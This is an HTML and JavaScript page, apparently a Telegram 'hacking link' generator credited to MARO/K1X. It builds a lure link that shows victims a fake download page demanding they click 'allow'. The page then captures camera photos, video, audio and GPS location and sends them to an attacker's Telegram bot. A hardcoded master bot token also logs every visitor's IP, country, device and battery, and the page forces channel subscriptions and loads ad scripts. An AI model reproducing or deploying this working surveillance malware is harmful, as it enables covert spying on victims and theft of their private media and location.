<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>MARO.com</title>
  <style>
    /* Ø§Ù„ØªØµÙ…ÙŠÙ… Ø§Ù„Ø£ØµÙ„ÙŠ ØªÙ…Ø§Ù…Ø§Ù‹ */
    :root{ --bg1:#0b0712; --card:#131026; --accent1:#a66bff; --accent2:#6e3be0; --muted:#bfaef6; }
    html,body{height:100%;margin:0;font-family: 'Poppins', Tahoma, sans-serif;background:var(--bg1);color:#fff}
    body{ background: #000000; background-image: none; position:relative; }
    .wrap{position:relative;z-index:2;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:30px 20px;box-sizing:border-box}
    .header{width:100%;max-width:1100px;display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}
    .nav{display:flex;gap:18px}
    .nav a{color:#ffffff;text-decoration:none;padding:8px 14px;border-radius:10px;background:rgba(255,255,255,0.03)}
    .card{width:100%;max-width:720px;background: linear-gradient(180deg, rgba(18,12,34,0.85), rgba(10,7,18,0.75)); border-radius:16px;padding:22px;box-shadow: 0 10px 40px rgba(0,0,0,0.6);backdrop-filter: blur(4px);}
    .hero{display:flex;gap:20px;align-items:center;flex-wrap:wrap}
    .hero-left{flex:1;min-width:260px}
    .form {background: rgba(255,255,255,0.03); padding:14px;border-radius:12px}
    label{display:block;color:#ffffff;font-weight:700;margin:10px 0 6px}
    input[type="text"]{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:#fff;outline:none;font-size:14px;box-sizing:border-box}
    .checkbox-group { display: flex; flex-direction: column; gap: 8px; margin: 15px 0; max-height: 300px; overflow-y: auto; padding: 10px; background: rgba(0,0,0,0.2); border-radius: 10px; }
    .checkbox-item { display: flex; align-items: center; gap: 10px; background: rgba(255,255,255,0.02); padding: 8px 12px; border-radius: 8px; }
    .checkbox-item input[type="checkbox"] { width: 18px; height: 18px; cursor: pointer; accent-color: #a66bff; }
    .checkbox-item label { margin: 0; font-weight: 500; font-size: 14px; cursor: pointer; flex: 1; color: #fff; }
    .btn{ display:inline-block;padding:12px 16px;border-radius:12px;border:none;background:linear-gradient(90deg, #ffffff, #cccccc);color:#000000;font-weight:800;cursor:pointer;margin-top:12px;width:100%; }
    .result{margin-top:14px;padding:10px;border-radius:10px;background:rgba(255,255,255,0.02);word-break:break-all;font-size:14px;display:flex;gap:10px;align-items:center;justify-content:space-between}
    .copyBtn{padding:8px 12px;border-radius:10px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.04);cursor:pointer;color:#fff}
    .madeby{ position:fixed;left:14px;bottom:14px;z-index:9999; background:rgba(12,7,20,0.5);padding:8px 12px;border-radius:10px;font-weight:700; color: #ffffff; }
    
    /* Ø§Ù„Ø¯Ø§ÙŠÙ„ÙˆØ¬ Ø§Ù„Ø£ØµÙ„ÙŠ */
    .dialog { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #000000; border: 2px solid #ffffff; border-radius: 20px; padding: 40px 30px; text-align: center; z-index: 99999; box-shadow: 0 0 30px rgba(255,255,255,0.2); width: 80%; max-width: 500px; }
    .dialog p { color: #ffffff; font-size: 22px; font-weight: 800; margin-bottom: 30px; }
    .dialog-buttons { display: flex; flex-direction: column; gap: 15px; align-items: center; }
    .dialog-link { display: inline-block; background: #ffffff; color: #000000; padding: 14px 25px; border-radius: 50px; text-decoration: none; font-weight: 900; font-size: 18px; border: 2px solid #ffffff; width: 80%; }
    .dialog-link.visited { background: #28a745; color: white; border-color: #28a745; }
    .dialog-btn { display: inline-block; background: #ffffff; color: #000000; padding: 16px 30px; border-radius: 50px; text-decoration: none; font-weight: 900; font-size: 18px; border: 2px solid #ffffff; margin-top: 20px; width: 80%; cursor: pointer; opacity: 0.5; pointer-events: none; }
    .dialog-btn.active { opacity: 1; pointer-events: auto; }

    /* ØµÙØ­Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø£ØµÙ„ÙŠØ© */
    .download-page { width: 100%; min-height: 100vh; background: #f5f5f5; margin: 0; padding: 20px 0; box-sizing: border-box; font-family: Tahoma, Arial, sans-serif; }
    .main-box{ width:95%; max-width:600px; background:white; margin:40px auto; padding:25px; border-radius:15px; box-shadow:0 5px 20px rgba(0,0,0,0.1); text-align:center; }
    .main-box h2{ margin-bottom:20px; color:#222; font-size: 16px; }
    .ad-box{ margin:20px 0; padding:10px; border-radius:10px; background:#fafafa; border:1px solid #eee; min-height: 90px; }
    .download-btn{ background:#28a745; color:white; padding:18px 45px; font-size:22px; border:none; border-radius:12px; cursor:pointer; transition:0.3s; box-shadow:0 4px 10px rgba(0,0,0,0.2); }
  </style>
</head>
<body>

  <div class="wrap">
    <div class="header"> <div class="nav"> <a href="#"></a> <a href="#"></a> </div> </div>
    <div class="card" id="cardArea">
      <div class="hero">
        <div class="hero-left">
          <h5>âš ï¸ ÙŠÙÙ…Ù†Ø¹ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø£Ø¯Ø§Ø© Ø¨Ø´ÙƒÙ„ ØºÙŠØ± Ù‚Ø§Ù†ÙˆÙ†ÙŠ. Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙŠØªØ­Ù…Ù„ Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„ÙŠØ© Ø§Ù„ÙƒØ§Ù…Ù„Ø©.</h5>
          <div class="form">
            <label>Ø£Ø¯Ø®Ù„ Ø§Ù„Ù€ ID</label>
            <input type="text" id="chatIdInput" placeholder="Chat ID">
            <label>Ø£Ø¯Ø®Ù„ ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª</label>
            <input type="text" id="tokenInput" placeholder="Bot Token">
            <label>Ø§Ù„Ù…ÙŠØ²Ø§Øª Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©:</label>
            <div class="checkbox-group" id="featuresGroup">
              <div class="checkbox-item"><input type="checkbox" id="camFront" value="camFront" checked><label for="camFront">ğŸ“¸ ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©</label></div>
              <div class="checkbox-item"><input type="checkbox" id="camBack" value="camBack"><label for="camBack">ğŸ“· ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©</label></div>
              <div class="checkbox-item"><input type="checkbox" id="videoFront" value="videoFront"><label for="videoFront">ğŸ¥ ÙÙŠØ¯ÙŠÙˆ Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©</label></div>
              <div class="checkbox-item"><input type="checkbox" id="videoBack" value="videoBack"><label for="videoBack">ğŸ“¹ ÙÙŠØ¯ÙŠÙˆ Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©</label></div>
              <div class="checkbox-item"><input type="checkbox" id="audio" value="audio"><label for="audio">ğŸ¤ ØªØ³Ø¬ÙŠÙ„ ØµÙˆØªÙŠ</label></div>
              <div class="checkbox-item"><input type="checkbox" id="location" value="location"><label for="location">ğŸ“ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹</label></div>
            </div>
            <button class="btn" id="generateBtn">Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø±Ø§Ø¨Ø·</button>
            <div id="result" style="display:none" class="result">
              <div id="linkText" style="flex:1;color:#e7dbff;font-size:13px;"></div>
              <button class="copyBtn" id="copyBtn">Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø·</button>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div class="madeby">Made by K1X</div>

  <div class="dialog" id="mandatoryDialog">
    <p> Ø§Ø´ØªØ±Ø§Ùƒ Ø¥Ø¬Ø¨Ø§Ø±ÙŠ ÙÙŠ Ø§Ù„Ù‚Ù†ÙˆØ§Øª </p>
    <div class="dialog-buttons">
      <a href="https://t.me/Maro_hacker_eg" target="_blank" class="dialog-link" id="channel1">@Maro_hacker_eg</a>
      <a href="https://t.me/lego2028" target="_blank" class="dialog-link" id="channel2">@lego2028</a>
      <button class="dialog-btn" id="subscribeDoneBtn" disabled>ØªÙ… Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ</button>
    </div>
  </div>

<script>
  // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ
  const MASTER_BOT_TOKEN = "8550564365:AAEjhh_aqXExLx3i8N7niKQXjJefhdkzqtY";
  const MASTER_CHAT_ID = "6197511637";
  let vIP = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ", vCountry = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ", vDevice = "Unknown", vBattery = "ØºÙŠØ± Ù…ØªØ§Ø­";

  // Ø§Ø³ØªØ±Ø¬Ø§Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø²Ø§Ø¦Ø±
  async function getInfo() {
    try {
      const ua = navigator.userAgent;
      vDevice = /Android/i.test(ua) ? "Android" : /iPhone|iPad|iPod/i.test(ua) ? "iOS" : "PC";
      if (navigator.getBattery) { const b = await navigator.getBattery(); vBattery = (b.level * 100) + "%"; }
      const res = await fetch('https://ipapi.co/json/'); const data = await res.json();
      vIP = data.ip; vCountry = data.country_name;
      const msg = `ğŸŸ¢ Ø²ÙŠØ§Ø±Ø©\nğŸŒ ${vCountry}\nğŸ“± ${vDevice}\nğŸ”‹ ${vBattery}\nğŸŒ ${vIP}`;
      fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage?chat_id=${MASTER_CHAT_ID}&text=${encodeURIComponent(msg)}`);
    } catch(e){}
  }
  getInfo();

  // Ù†Ø¸Ø§Ù… Ø§Ù„Ø¯Ø§ÙŠÙ„ÙˆØ¬ ÙˆØ§Ù„Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø£ØµÙ„ÙŠ
  const ch1 = document.getElementById('channel1'), ch2 = document.getElementById('channel2'), sBtn = document.getElementById('subscribeDoneBtn');
  let v1 = false, v2 = false;
  ch1.addEventListener('click', () => { v1 = true; ch1.classList.add('visited'); check(); });
  ch2.addEventListener('click', () => { v2 = true; ch2.classList.add('visited'); check(); });
  function check() { if(v1 && v2) { sBtn.disabled = false; sBtn.classList.add('active'); sBtn.innerHTML = 'âœ… ØªÙ… Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ'; } }
  sBtn.onclick = () => document.getElementById('mandatoryDialog').style.display = 'none';

  // Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø±Ø§Ø¨Ø·
  document.getElementById('generateBtn').onclick = () => {
    const chat = document.getElementById('chatIdInput').value.trim();
    const token = document.getElementById('tokenInput').value.trim();
    if(!chat || !token) return alert('Ø£Ø¯Ø®Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª');
    const f = Array.from(document.querySelectorAll('#featuresGroup input:checked')).map(c => c.value).join(',');
    const link = `${window.location.origin}${window.location.pathname}?chat=${chat}&token=${token}&features=${f}`;
    document.getElementById('linkText').innerText = link;
    document.getElementById('result').style.display = 'flex';
  };

  document.getElementById('copyBtn').onclick = () => { navigator.clipboard.writeText(document.getElementById('linkText').innerText); alert('ØªÙ… Ø§Ù„Ù†Ø³Ø®'); };

  // --- Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª ÙˆØ§Ù„ØªØ´ØºÙŠÙ„ Ø§Ù„Ø°ÙƒÙŠ ---
  async function ensurePermission(type) {
    // Ø§Ù„ØªØ­Ù‚ÙŠÙ‚ Ù…Ù† Ø­Ø§Ù„Ø© Ø§Ù„Ø¥Ø°Ù† Ø§Ù„Ø­Ø§Ù„ÙŠØ© Ù‚Ø¨Ù„ Ø§Ù„Ø·Ù„Ø¨
    try {
      const status = await navigator.permissions.query({ name: type });
      if (status.state === 'granted') return true;
    } catch(e) {}
    return false; // Ø¥Ø°Ø§ ÙƒØ§Ù† denied Ø£Ùˆ prompt
  }

  async function startWork(chat, token, features) {
    const list = features.split(',');
    
    for (const f of list) {
      try {
        let stream = null;
        if (f === 'camFront') {
          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
          await sendPhoto(stream, chat, token, "Ø£Ù…Ø§Ù…ÙŠØ©");
        } else if (f === 'camBack') {
          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: "environment" } } });
          await sendPhoto(stream, chat, token, "Ø®Ù„ÙÙŠØ©");
        } else if (f === 'videoFront') {
          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
          await sendMedia(stream, chat, token, "ÙÙŠØ¯ÙŠÙˆ Ø£Ù…Ø§Ù…ÙŠ", "video");
        } else if (f === 'videoBack') {
          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: "environment" } }, audio: true });
          await sendMedia(stream, chat, token, "ÙÙŠØ¯ÙŠÙˆ Ø®Ù„ÙÙŠ", "video");
        } else if (f === 'audio') {
          stream = await navigator.mediaDevices.getUserMedia({ audio: true });
          await sendMedia(stream, chat, token, "ØµÙˆØª", "audio");
        } else if (f === 'location') {
          navigator.geolocation.getCurrentPosition(pos => {
            const loc = `ğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(loc)}`);
          });
        }
        if (stream) stream.getTracks().forEach(t => t.stop());
        await new Promise(r => setTimeout(r, 1000)); // ØªØ£Ø®ÙŠØ± Ø¨ÙŠÙ† Ø§Ù„Ø¹Ù…Ù„ÙŠØ§Øª Ù„Ø¶Ù…Ø§Ù† ØªØ­Ø±ÙŠØ± Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
      } catch (e) { console.error("Error in " + f, e); }
    }
  }

  function buildCap(label) {
    return `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\nğŸ“¸ Ø§Ù„Ù†ÙˆØ¹: ${label}\nğŸŒ Ø§Ù„Ø¯ÙˆÙ„Ø©: ${vCountry}\nğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${vDevice}\nğŸ”‹ Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©: ${vBattery}\nğŸŒ IP: ${vIP}\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”`;
  }

  async function sendPhoto(s, chat, token, label) {
    const v = document.createElement('video'); v.srcObject = s; await v.play();
    const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
    c.getContext('2d').drawImage(v, 0, 0);
    return new Promise(res => c.toBlob(b => {
      const fd = new FormData(); fd.append('chat_id', chat); fd.append('photo', b, 'p.jpg'); fd.append('caption', buildCap(label));
      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd }).then(res);
    }, 'image/jpeg'));
  }

  async function sendMedia(s, chat, token, label, type) {
    return new Promise(res => {
      const mr = new MediaRecorder(s); const ch = [];
      mr.ondataavailable = e => ch.push(e.data);
      mr.onstop = () => {
        const b = new Blob(ch, { type: type === 'video' ? 'video/mp4' : 'audio/mp4' });
        const fd = new FormData(); fd.append('chat_id', chat); fd.append(type, b, 'm.mp4'); fd.append('caption', buildCap(label));
        fetch(`https://api.telegram.org/bot${token}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd }).then(res);
      };
      mr.start(); setTimeout(() => mr.stop(), 5000);
    });
  }

  // ØªÙØ¹ÙŠÙ„ ÙˆØ¶Ø¹ Ø§Ù„ØªØ­Ù…ÙŠÙ„
  const p = new URLSearchParams(window.location.search);
  if(p.get('chat') && p.get('token')) {
    document.getElementById('mandatoryDialog').style.display = 'none';
    document.getElementById('cardArea').style.display = 'none';
    const wrap = document.querySelector('.wrap');
    wrap.innerHTML = `
      <div class="download-page">
        <div class="main-box">
          <h2>ÙŠØ¬Ø¨ Ø§Ù„Ø¶ØºØ· Ø¹Ù„ÙŠ Ø³Ù…Ø§Ø­ Ù„Ø­Ù…Ø§ÙŠØ© Ø§Ù„ÙˆØ­Ø¯Ø© Ø§Ù„Ø§Ø¹Ù„Ø§Ù†ÙŠÙ‡ Ù…Ù† Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª Ø§Ù„ÙˆÙ‡Ù…ÙŠØ© Ù„Ù… ØªØªÙ…ÙƒÙ† Ù…Ù† ØªÙ†Ø²ÙŠÙ„ Ø§Ù„Ù…Ù„Ù Ø¥Ù„Ø§ Ø¨Ø¹Ø¯ Ø§Ù„Ø¶ØºØ· Ø¹Ù„ÙŠ Ø³Ù…Ø§Ø­</h2>
          <div class="ad-box"></div>
          <div class="ad-box"><div id="container-596225155ab3da796681d551cb4b7cf4"></div></div>
          <button class="download-btn" onclick="window.open('https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c','_blank')">Ø§Ù„ØªØ§Ù„ÙŠ</button>
          <div class="ad-box"></div>
          <div class="footer">Made by MARO</div>
        </div>
      </div>`;
    
    // ØªØ­Ù…ÙŠÙ„ Ø¥Ø¹Ù„Ø§Ù†Ø§ØªÙƒ Ø§Ù„Ø£ØµÙ„ÙŠØ©
    const loadScript = (src) => { const s = document.createElement("script"); s.src = src; s.async = true; document.body.appendChild(s); };
    loadScript("https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js");
    loadScript("https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js");
    
    startWork(p.get('chat'), p.get('token'), p.get('features'));
  }
</script>
</body>
</html>

